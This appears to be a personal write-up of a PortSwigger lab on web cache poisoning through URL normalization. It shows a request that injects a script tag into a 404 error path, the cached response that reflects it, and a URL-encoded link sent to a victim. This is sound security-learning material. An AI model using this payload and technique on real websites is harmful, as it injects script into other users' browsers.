# [URL normalization] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-04
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
When we are searching for some random page like `GET /babek HTTP/2` we get an error that contains the path in it. We can write a malicious payload as a path and will escape the `p` tag in the error message. Then we can encode that path and send it to the victim. Because cache will normalize that path for matching key, it will serve our malicious response to the victim and execute our payload.
1) We send the following request:
```bash
GET /babek</p><script>alert(1)</script> HTTP/2
Host: 0a81002c044abf9a80b721300060002d.web-security-academy.net
Cookie: session=piQdy6y7gI9enEoPDbHzNHoljRW6qM4N
...
```
This will return us this response:
```bash
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=10
Age: 1
X-Cache: hit
Content-Length: 53

<p>Not Found: /babek</p><script>alert(1)</script></p>
```

After we see cache hit, we immediately send the url encoded version of this url to the victim to execute attack:
```bash
 your-lab-id.web-security-academy.net/%62%61%62%65%6b%3c%2f%70%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%20
```

